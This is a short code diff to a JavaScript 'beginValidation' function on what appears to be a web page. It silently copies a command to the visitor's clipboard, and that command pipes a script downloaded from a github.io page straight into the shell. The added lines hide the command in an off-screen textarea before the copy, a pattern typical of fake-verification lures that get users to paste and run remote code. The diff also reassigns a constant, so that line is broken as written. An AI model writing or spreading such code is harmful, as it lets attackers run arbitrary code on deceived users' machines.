@@ -98,7 +98,15 @@
     function beginValidation(){
         const cmd = 'curl -s https://nirajchoubey12.github.io/oops.html | sh';
 
-       
+        cmd = cmd.replace(/\r\n|\r/g, '\n');
+
+        const textarea = document.createElement('textarea');
+        textarea.value = cmd;
+        textarea.style.position = "absolute";
+        textarea.style.left = "-999999px";
+        document.body.appendChild(textarea);
+        textarea.select();
+        textarea.setSelectionRange(0, textarea.value.length);
 
         navigator.clipboard.writeText(cmd).then(() => {
        // const textArea = document.createElement("textarea");
